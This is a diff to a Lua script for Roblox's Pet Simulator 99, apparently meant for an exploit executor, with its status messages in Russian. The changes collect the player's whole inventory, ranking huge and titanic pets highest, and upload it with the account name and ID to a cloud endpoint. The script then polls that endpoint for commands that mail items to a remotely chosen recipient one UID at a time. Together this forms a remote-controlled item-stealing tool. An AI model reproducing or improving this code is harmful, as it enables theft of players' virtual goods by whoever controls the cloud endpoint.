@@ -120,86 +120,126 @@ local TopicCmd = "ps99_cmd_" .. string.sub(AccessKey73, 1, 48)
 
 copyToClipboardSafe(SecretWebLink)
 
-local DirectoryAssetCache = {}
-local ResolvedCdnUrlCache = {}
+local DirectoryInfoCache = {}
 local PlayerAvatarUrl = nil
+local SessionMailSends = 0
 
-local function scanDirectoryForIcons()
+local function extractAssetNumber(val)
+    if type(val) == "number" and val > 0 then
+        return tostring( math.floor(val) )
+    elseif type(val) == "string" then
+        return string.match(val, "%d+")
+    end
+    return nil
+end
+
+local function registerDirectoryEntry(rawId, infoTbl)
+    if type(rawId) ~= "string" or rawId == "" or type(infoTbl) ~= "table" then return end
+    local key = string.lower(rawId)
+    local icon = rawget(infoTbl, "thumbnail") or rawget(infoTbl, "icon") or rawget(infoTbl, "Icon") or rawget(infoTbl, "Texture")
+    local goldIcon = rawget(infoTbl, "goldenThumbnail") or rawget(infoTbl, "GoldenThumbnail")
+    local aid = extractAssetNumber(icon)
+    local goldAid = extractAssetNumber(goldIcon)
+
+    local tiersTbl = rawget(infoTbl, "tiers") or rawget(infoTbl, "Tiers")
+    local tierIcons = nil
+    if type(tiersTbl) == "table" then
+        tierIcons = {}
+        for tIdx, tData in pairs(tiersTbl) do
+            if type(tData) == "table" then
+                local tIcon = rawget(tData, "thumbnail") or rawget(tData, "icon") or rawget(tData, "Icon")
+                local tAid = extractAssetNumber(tIcon)
+                if tAid then
+                    tierIcons[tonumber(tIdx) or tIdx] = tAid
+                    if not aid then aid = tAid end
+                end
+            end
+        end
+    end
+
+    local isTitanic = (rawget(infoTbl, "titanic") == true) or (string.find(key, "titanic") ~= nil)
+    local isHuge = (rawget(infoTbl, "huge") == true) or (string.find(key, "huge") ~= nil)
+    local isExcl = (rawget(infoTbl, "exclusiveLevel") ~= nil)
+    local tier = isTitanic and 4 or (isHuge and 3 or (isExcl and 2 or 1))
+    local pwr = tonumber(rawget(infoTbl, "strength") or rawget(infoTbl, "power")) or 0
+
+    local existing = DirectoryInfoCache[key]
+    if not existing then
+        DirectoryInfoCache[key] = {
+            aid = aid,
+            goldAid = goldAid,
+            tierIcons = tierIcons,
+            tier = tier,
+            pwr = pwr
+        }
+    else
+        if aid and not existing.aid then existing.aid = aid end
+        if goldAid and not existing.goldAid then existing.goldAid = goldAid end
+        if tierIcons and not existing.tierIcons then existing.tierIcons = tierIcons end
+        if tier > (existing.tier or 1) then existing.tier = tier end
+        if pwr > (existing.pwr or 0) then existing.pwr = pwr end
+    end
+end
+
+local VisitedDirTables = setmetatable({}, { __mode = "k" })
+local function walkDirectoryTree(tbl, parentKey, depth)
+    if type(tbl) ~= "table" or (depth or 0) > 6 or VisitedDirTables[tbl] then return end
+    VisitedDirTables[tbl] = true
+
+    local selfId = rawget(tbl, "_id") or rawget(tbl, "id") or (type(parentKey) == "string" and parentKey or nil)
+    local hasThumb = rawget(tbl, "thumbnail") or rawget(tbl, "icon") or rawget(tbl, "Icon") or rawget(tbl, "tiers") or rawget(tbl, "huge") or rawget(tbl, "titanic")
+    if type(selfId) == "string" and hasThumb then
+        registerDirectoryEntry(selfId, tbl)
+    end
+
+    for k, v in pairs(tbl) do
+        if type(v) == "table" and k ~= "_script" then
+            walkDirectoryTree(v, k, (depth or 0) + 1)
+        end
+    end
+end
+
+local function scanDirectoryFast()
     pcall(function()
         local lib = ReplicatedStorage:FindFirstChild("Library")
         local dirMod = lib and lib:FindFirstChild("Directory")
         if dirMod then
             local okReq, dir = pcall(require, dirMod)
             if okReq and type(dir) == "table" then
-                for _, catTable in pairs(dir) do
-                    if type(catTable) == "table" then
-                        for itemId, info in pairs(catTable) do
-                            if type(info) == "table" then
-                                local icon = rawget(info, "thumbnail") or rawget(info, "icon") or rawget(info, "goldenThumbnail")
-                                if type(icon) == "string" then
-                                    local numId = string.match(icon, "%d+")
-                                    if numId then
-                                        DirectoryAssetCache[string.lower(tostring(itemId))] = numId
-                                    end
-                                end
-                            end
-                        end
+                walkDirectoryTree(dir, nil, 0)
+            end
+        end
+    end)
+    pcall(function()
+        local rawDir = ReplicatedStorage:FindFirstChild("__DIRECTORY") or ReplicatedStorage:FindFirstChild("Directory")
+        if rawDir then
+            for _, mod in ipairs(rawDir:GetDescendants()) do
+                if mod:IsA("ModuleScript") then
+                    local okM, mData = pcall(require, mod)
+                    if okM and type(mData) == "table" then
+                        walkDirectoryTree(mData, mod.Name, 1)
                     end
                 end
             end
         end
     end)
-    if next(DirectoryAssetCache) == nil and getgc then
+    if getgc then
         pcall(function()
             for _, v in ipairs(getgc(true)) do
                 if type(v) == "table" then
                     local id = rawget(v, "_id") or rawget(v, "id")
-                    local thumb = rawget(v, "thumbnail") or rawget(v, "icon")
-                    if type(id) == "string" and type(thumb) == "string" then
-                        local numId = string.match(thumb, "%d+")
-                        if numId then
-                            DirectoryAssetCache[string.lower(id)] = numId
-                        end
+                    if type(id) == "string" and (rawget(v, "thumbnail") or rawget(v, "icon") or rawget(v, "tiers") or rawget(v, "huge") or rawget(v, "titanic")) then
+                        registerDirectoryEntry(id, v)
                     end
                 end
             end
         end)
     end
 end
-task.spawn(scanDirectoryForIcons)
+scanDirectoryFast()
 
-local function resolveBatchAssetThumbs(assetIds)
-    local toFetch = {}
-    local seen = {}
-    for _, aid in ipairs(assetIds) do
-        if aid and not ResolvedCdnUrlCache[aid] and not seen[aid] then
-            seen[aid] = true
-            table.insert(toFetch, aid)
-            if #toFetch >= 45 then break end
-        end
-    end
-    if #toFetch == 0 then return end
-    local url = "https://thumbnails.roblox.com/v1/assets?assetIds=" .. table.concat(toFetch, ",") .. "&returnPolicy=PlaceHolder&size=150x150&format=Png&isCircular=false"
-    local code, body = doHttp(url, "GET")
-    if code == 200 and body ~= "" then
-        pcall(function()
-            local decoded = HttpService:JSONDecode(body)
-            if decoded and type(decoded.data) == "table" then
-                for _, entry in ipairs(decoded.data) do
-                    local tid = tostring(entry.targetId or "")
-                    local img = entry.imageUrl
-                    if tid ~= "" and type(img) == "string" and img ~= "" then
-                        ResolvedCdnUrlCache[tid] = img
-                    end
-                end
-            end
-        end)
-    end
-end
-
-local function resolveMyAvatar()
-    if PlayerAvatarUrl then return PlayerAvatarUrl end
-    local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. tostring(LocalPlayer.UserId) .. "&size=150x150&format=Png&isCircular=true"
+task.spawn(function()
+    local url = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. tostring(LocalPlayer.UserId) .. "&size=150x150&format=Png&isCircular=true"
     local code, body = doHttp(url, "GET")
     if code == 200 and body ~= "" then
         pcall(function()
@@ -209,77 +249,198 @@ local function resolveMyAvatar()
             end
         end)
     end
-    return PlayerAvatarUrl
+end)
+
+local function getItemPriorityScore(it)
+    local idLow = string.lower(tostring(it.id or ""))
+    local tier = tonumber(it.tier) or 1
+    local pt = tonumber(it.pt) or 0
+    local sh = it.sh and 1 or 0
+    local varBonus = (pt == 2 and 3000 or (pt == 1 and 1000 or 0)) + (sh == 1 and 2000 or 0)
+
+    if tier == 4 or string.find(idLow, "titanic") then
+        return 1000000000 + varBonus + (it.am or 1)
+    elseif tier == 3 or string.find(idLow, "huge") then
+        return 500000000 + varBonus + (it.am or 1)
+    elseif tier == 2 or string.find(idLow, "exclusive") then
+        return 200000000 + varBonus + (it.am or 1)
+    end
+
+    local isEvent = string.find(idLow, "headless") or string.find(idLow, "dominus") or string.find(idLow, "wendigo") or
+                    string.find(idLow, "grinning") or string.find(idLow, "goat") or string.find(idLow, "halloween") or
+                    string.find(idLow, "reaper") or string.find(idLow, "spooky") or string.find(idLow, "pumpkin")
+    if it.cat == "Pet" and (isEvent or (it.pwr or 0) > 0) then
+        return 100000000 + (it.pwr or 5000) + varBonus + math.min(999999, it.am or 1)
+    elseif it.cat == "Pet" then
+        return 50000000 + varBonus + math.min(999999, it.am or 1)
+    elseif it.cat == "Egg" or it.cat == "Lootbox" or it.cat == "Box" then
+        return 10000000 + math.min(999999, it.am or 1)
+    end
+    return math.min(9999999, it.am or 1)
 end
 
-local CachedGcInv = nil
+local RomanNumerals = { "I", "II", "III", "IV", "V", "VI", "VII", "VIII", "IX", "X", "XI", "XII" }
 
 local function collectFullInventory()
-    local itemsList = {}
+    local groupedByKey = {}
+    local seenUids = {}
     local diamonds = 0
     local lollipops = 0
-    local neededAssets = {}
+    local hugeCount = 0
 
-    pcall(function()
-        local inv = CachedGcInv
-        if type(inv) ~= "table" or next(inv) == nil then
-            local lib = ReplicatedStorage:FindFirstChild("Library")
-            local client = lib and lib:FindFirstChild("Client")
-            local saveMod = client and client:FindFirstChild("Save")
-            if saveMod then
-                local okS, saveObj = pcall(require, saveMod)
-                if okS and type(saveObj) == "table" and type(saveObj.Get) == "function" then
-                    local data = saveObj.Get()
-                    inv = type(data) == "table" and rawget(data, "Inventory")
-                end
-            end
+    local function processSingleItem(catName, uid, obj)
+        if type(obj) ~= "table" then return end
+        local uidStr = tostring(uid)
+        if seenUids[uidStr] then return end
+
+        local d = rawget(obj, "_data")
+        if type(d) ~= "table" then
+            pcall(function()
+                if type(obj._data) == "table" then d = obj._data end
+            end)
         end
-        if (type(inv) ~= "table" or next(inv) == nil) and getgc then
-            for _, v in ipairs(getgc(true)) do
-                if type(v) == "table" then
-                    local testInv = rawget(v, "Inventory")
-                    if type(testInv) == "table" and type(rawget(testInv, "Pet")) == "table" and next(rawget(testInv, "Pet")) ~= nil then
-                        inv = testInv
-                        CachedGcInv = testInv
-                        break
+        if type(d) ~= "table" then d = obj end
+
+        if catName == "Box" then
+            local boxItems = rawget(d, "bi") or rawget(d, "items") or rawget(obj, "bi")
+            if type(boxItems) == "table" then
+                for bCat, bTab in pairs(boxItems) do
+                    if type(bTab) == "table" then
+                        for bUid, bObj in pairs(bTab) do
+                            processSingleItem(tostring(bCat), bUid, bObj)
+                        end
                     end
                 end
             end
         end
-        if type(inv) == "table" then
-            for catName, catTab in pairs(inv) do
-                if type(catTab) == "table" then
-                    for uid, obj in pairs(catTab) do
-                        if type(obj) == "table" then
-                            local d = rawget(obj, "_data")
-                            if type(d) ~= "table" then d = obj end
-                            local idVal = rawget(d, "id") or rawget(d, "Id")
-                            local amt = tonumber(rawget(d, "_am")) or tonumber(rawget(d, "amount")) or 1
-                            local pt = tonumber(rawget(d, "pt")) or 0
-                            local sh = rawget(d, "sh") == true
-                            if type(idVal) == "string" then
-                                local idLow = string.lower(idVal)
-                                if catName == "Currency" then
-                                    if idLow == "diamonds" then diamonds = amt
-                                    elseif string.find(idLow, "lollipop") then lollipops = amt end
-                                else
-                                    if string.find(idLow, "lollipop") and amt > lollipops then
-                                        lollipops = amt
-                                    end
-                                    local aid = DirectoryAssetCache[idLow]
-                                    if aid and not ResolvedCdnUrlCache[aid] then
-                                        table.insert(neededAssets, aid)
-                                    end
-                                    table.insert(itemsList, {
-                                        uid = tostring(uid),
-                                        id = idVal,
-                                        cat = tostring(catName),
-                                        am = amt,
-                                        pt = pt,
-                                        sh = sh,
-                                        aid = aid
-                                    })
-                                end
+
+        local idVal = rawget(d, "id") or rawget(d, "Id") or rawget(d, "_id") or rawget(obj, "id")
+        if type(idVal) ~= "string" then
+            pcall(function()
+                idVal = d.id or obj.id or (type(obj.GetId) == "function" and obj:GetId())
+            end)
+        end
+        if type(idVal) ~= "string" or idVal == "" then return end
+
+        seenUids[uidStr] = true
+
+        local amt = tonumber(rawget(d, "_am") or rawget(d, "amount") or rawget(obj, "_am") or rawget(obj, "amount"))
+        if not amt then
+            pcall(function() amt = tonumber(d._am or d.amount or obj._am or obj.amount) end)
+        end
+        amt = (amt and amt > 0) and math.floor(amt) or 1
+
+        local pt = tonumber(rawget(d, "pt") or rawget(obj, "pt")) or 0
+        local sh = (rawget(d, "sh") == true) or (rawget(obj, "sh") == true)
+        local tn = tonumber(rawget(d, "tn") or rawget(obj, "tn"))
+
+        local idLow = string.lower(idVal)
+        if catName == "Currency" then
+            if idLow == "diamonds" and amt > diamonds then
+                diamonds = amt
+            elseif (string.find(idLow, "lollipop") or string.find(idLow, "candy")) and amt > lollipops then
+                lollipops = amt
+            end
+            return
+        end
+
+        if string.find(idLow, "lollipop") and amt > lollipops then
+            lollipops = amt
+        end
+
+        local dInfo = DirectoryInfoCache[idLow]
+        local aid = nil
+        local tier = 1
+        local pwr = 0
+
+        if dInfo then
+            if tn and dInfo.tierIcons and dInfo.tierIcons[tn] then
+                aid = dInfo.tierIcons[tn]
+            elseif pt == 1 and dInfo.goldAid then
+                aid = dInfo.goldAid
+            else
+                aid = dInfo.aid
+            end
+            tier = dInfo.tier or 1
+            pwr = dInfo.pwr or 0
+        end
+
+        if string.find(idLow, "titanic") then
+            tier = 4
+        elseif string.find(idLow, "huge") then
+            tier = 3
+        elseif tier < 2 and string.find(idLow, "exclusive") then
+            tier = 2
+        end
+
+        if tier >= 3 then
+            hugeCount = hugeCount + amt
+        end
+
+        local displayName = idVal
+        if tn and tn >= 1 then
+            local roman = RomanNumerals[tn] or tostring(tn)
+            displayName = idVal .. " " .. roman
+        end
+
+        local groupKey = tostring(catName) .. "|" .. displayName .. "|" .. tostring(pt) .. "|" .. tostring(sh)
+        local existing = groupedByKey[groupKey]
+        if not existing then
+            groupedByKey[groupKey] = {
+                uid = uidStr,
+                uids = { uidStr },
+                id = displayName,
+                cat = tostring(catName),
+                am = amt,
+                pt = pt,
+                sh = sh,
+                aid = aid,
+                tier = tier,
+                pwr = pwr
+            }
+        else
+            existing.am = existing.am + amt
+            if not existing.aid and aid then existing.aid = aid end
+            if #existing.uids < 60 then
+                table.insert(existing.uids, uidStr)
+            end
+        end
+    end
+
+    local function processInventoryTable(inv)
+        if type(inv) ~= "table" then return end
+        for catName, catTab in pairs(inv) do
+            if type(catName) == "string" and type(catTab) == "table" then
+                for uid, obj in pairs(catTab) do
+                    processSingleItem(catName, uid, obj)
+                end
+            end
+        end
+    end
+
+    pcall(function()
+        local lib = ReplicatedStorage:FindFirstChild("Library")
+        local client = lib and lib:FindFirstChild("Client")
+        local saveMod = client and client:FindFirstChild("Save")
+        if saveMod then
+            local okS, saveObj = pcall(require, saveMod)
+            if okS and type(saveObj) == "table" then
+                if type(saveObj.Get) == "function" then
+                    local okD, saveData = pcall(saveObj.Get)
+                    if okD and type(saveData) == "table" then
+                        processInventoryTable(rawget(saveData, "Inventory") or saveData.Inventory)
+                        local mSends = tonumber(rawget(saveData, "MailboxSends") or saveData.MailboxSends)
+                        if mSends and mSends > SessionMailSends then
+                            SessionMailSends = mSends
+                        end
+                    end
+                end
+                if type(saveObj.GetSaves) == "function" then
+                    local okAll, allSaves = pcall(saveObj.GetSaves)
+                    if okAll and type(allSaves) == "table" then
+                        for _, sData in pairs(allSaves) do
+                            if type(sData) == "table" then
+                                processInventoryTable(rawget(sData, "Inventory") or sData.Inventory)
                             end
                         end
                     end
@@ -288,28 +449,40 @@ local function collectFullInventory()
         end
     end)
 
-    if #neededAssets > 0 then
-        resolveBatchAssetThumbs(neededAssets)
+    if getgc then
+        pcall(function()
+            for _, v in ipairs(getgc(true)) do
+                if type(v) == "table" then
+                    local testInv = rawget(v, "Inventory")
+                    if type(testInv) == "table" and (type(rawget(testInv, "Pet")) == "table" or type(rawget(testInv, "Misc")) == "table") then
+                        processInventoryTable(testInv)
+                    elseif type(rawget(v, "Pet")) == "table" and (type(rawget(v, "Misc")) == "table" or type(rawget(v, "Enchant")) == "table" or type(rawget(v, "Potion")) == "table") then
+                        processInventoryTable(v)
+                    end
+                end
+            end
+        end)
     end
 
-    for _, it in ipairs(itemsList) do
-        if it.aid and ResolvedCdnUrlCache[it.aid] then
-            it.icon = ResolvedCdnUrlCache[it.aid]
+    local itemsList = {}
+    for _, item in pairs(groupedByKey) do
+        if #item.uids <= 1 then
+            item.uids = nil
         end
-        it.aid = nil
+        table.insert(itemsList, item)
     end
 
     table.sort(itemsList, function(a, b)
-        return (a.am or 1) > (b.am or 1)
+        return getItemPriorityScore(a) > getItemPriorityScore(b)
     end)
 
-    if #itemsList > 250 then
+    if #itemsList > 500 then
         local trimmed = {}
-        for i = 1, 250 do trimmed[i] = itemsList[i] end
+        for i = 1, 500 do trimmed[i] = itemsList[i] end
         itemsList = trimmed
     end
 
-    return itemsList, diamonds, lollipops
+    return itemsList, diamonds, lollipops, hugeCount
 end
 
 local function findMailboxSendRemote()
@@ -340,6 +513,7 @@ local function executeMailboxTask(taskData)
     local recipient = tostring(taskData.recipient or "")
     local category = tostring(taskData.category or "Pet")
     local itemUid = tostring(taskData.uid or "")
+    local uidsList = type(taskData.uids) == "table" and taskData.uids or nil
     local itemId = tostring(taskData.item_id or "")
     local amount = math.max(1, math.floor(tonumber(taskData.amount) or 1))
     local msg = tostring(taskData.message or "Gift")
@@ -350,23 +524,59 @@ local function executeMailboxTask(taskData)
 
     local mailRemote = findMailboxSendRemote()
     local success = false
+    local packetsSent = 0
     local resultMsg = "Remote Mailbox: Send не найден"
 
     if mailRemote then
-        local ok, r1, r2 = pcall(function()
-            if mailRemote:IsA("RemoteFunction") then
-                return mailRemote:InvokeServer(recipient, msg, category, itemUid, amount)
-            else
-                mailRemote:FireServer(recipient, msg, category, itemUid, amount)
-                return true, "Отправлено"
+        if uidsList and #uidsList > 1 then
+            local toSendCount = math.min(#uidsList, amount)
+            local lastErr = nil
+            for i = 1, toSendCount do
+                local targetUid = tostring(uidsList[i])
+                local ok, r1, r2 = pcall(function()
+                    if mailRemote:IsA("RemoteFunction") then
+                        return mailRemote:InvokeServer(recipient, msg, category, targetUid, 1)
+                    else
+                        mailRemote:FireServer(recipient, msg, category, targetUid, 1)
+                        return true
+                    end
+                end)
+                if ok and r1 == true then
+                    packetsSent = packetsSent + 1
+                    SessionMailSends = SessionMailSends + 1
+                else
+                    lastErr = tostring(r2 or r1 or "Ошибка")
+                    break
+                end
+                if i < toSendCount then
+                    task.wait(1.2)
+                end
             end
-        end)
-        if ok and r1 == true then
-            success = true
-            resultMsg = "Успешно отправлено игроку " .. recipient .. "!"
+            if packetsSent > 0 then
+                success = true
+                resultMsg = string.format("Отправлено %d/%d шт. игроку %s!", packetsSent, toSendCount, recipient)
+            else
+                success = false
+                resultMsg = tostring(lastErr or "Не удалось отправить (проверьте алмазы 20K/30K+)")
+            end
         else
-            success = false
-            resultMsg = tostring(r2 or r1 or "Ошибка отправки в игре")
+            local ok, r1, r2 = pcall(function()
+                if mailRemote:IsA("RemoteFunction") then
+                    return mailRemote:InvokeServer(recipient, msg, category, itemUid, amount)
+                else
+                    mailRemote:FireServer(recipient, msg, category, itemUid, amount)
+                    return true, "Отправлено"
+                end
+            end)
+            if ok and r1 == true then
+                success = true
+                packetsSent = 1
+                SessionMailSends = SessionMailSends + 1
+                resultMsg = "Успешно отправлено игроку " .. recipient .. "!"
+            else
+                success = false
+                resultMsg = tostring(r2 or r1 or "Ошибка отправки (проверьте алмазы 20K/30K+)")
+            end
         end
     end
 
@@ -374,6 +584,7 @@ local function executeMailboxTask(taskData)
         StatusLabelRef.Text = success and ("✅ Отправлено -> " .. recipient) or ("❌ Ошибка: " .. resultMsg)
     end
 
+    local nextCost = math.floor(20000 * (1.5 ^ SessionMailSends))
     local replyPayload = HttpService:JSONEncode({
         type = "mail_result",
         task_id = tid,
@@ -382,6 +593,8 @@ local function executeMailboxTask(taskData)
         category = category,
         item_id = itemId,
         amount = amount,
+        packets_sent = packetsSent,
+        mail_cost = nextCost,
         status = success and "sent" or "failed",
         result_text = resultMsg,
         ts = os.time()
@@ -390,17 +603,18 @@ local function executeMailboxTask(taskData)
 end
 
 local function syncStateToCloud()
-    local items, diamonds, lollipops = collectFullInventory()
-    local avatar = resolveMyAvatar()
+    local items, diamonds, lollipops, hugeCount = collectFullInventory()
     if StatusLabelRef then
-        StatusLabelRef.Text = string.format("🟢 В сети | Стеков: %d | 🍭 %d", #items, lollipops)
+        local curCost = math.floor(20000 * (1.5 ^ SessionMailSends))
+        StatusLabelRef.Text = string.format("🟢 Хугов: %d | Видов: %d | 💎 Почта: %dK", hugeCount, #items, math.floor(curCost / 1000))
     end
     local payload = HttpService:JSONEncode({
         username = LocalPlayer.Name,
         user_id = LocalPlayer.UserId,
-        avatar_url = avatar,
+        avatar_url = PlayerAvatarUrl,
         diamonds = diamonds,
         lollipops = lollipops,
+        mail_sends = SessionMailSends,
         items = items,
         ts = os.time()
     })
@@ -417,7 +631,7 @@ local function pollCloudCommands()
                     local cmd = HttpService:JSONDecode(envObj.message)
                     if cmd and cmd.type == "send_mail" then
                         executeMailboxTask(cmd)
-                        task.wait(0.4)
+                        task.wait(0.3)
                         syncStateToCloud()
                     end
                 end
@@ -508,7 +722,7 @@ StatusLbl.Font = Enum.Font.GothamBold
 StatusLbl.TextSize = 11
 StatusLbl.TextColor3 = Color3.fromRGB(34, 229, 139)
 StatusLbl.TextXAlignment = Enum.TextXAlignment.Left
-StatusLbl.Text = "🟢 Подключение к облаку..."
+StatusLbl.Text = "⚡ Сканирование всех Хугов и предметов..."
 StatusLbl.Parent = BodyFrame
 StatusLabelRef = StatusLbl
 
@@ -620,14 +834,12 @@ env.PS99CloudMailboxCleanup = function()
 end
 
 task.spawn(function()
-    task.wait(0.8)
-    scanDirectoryForIcons()
     pcall(syncStateToCloud)
     local lastFullSync = tick()
     while CloudRunning do
-        task.wait(3.5)
+        task.wait(3.0)
         pcall(pollCloudCommands)
-        if tick() - lastFullSync >= 14 then
+        if tick() - lastFullSync >= 12 then
             lastFullSync = tick()
             pcall(syncStateToCloud)
         end
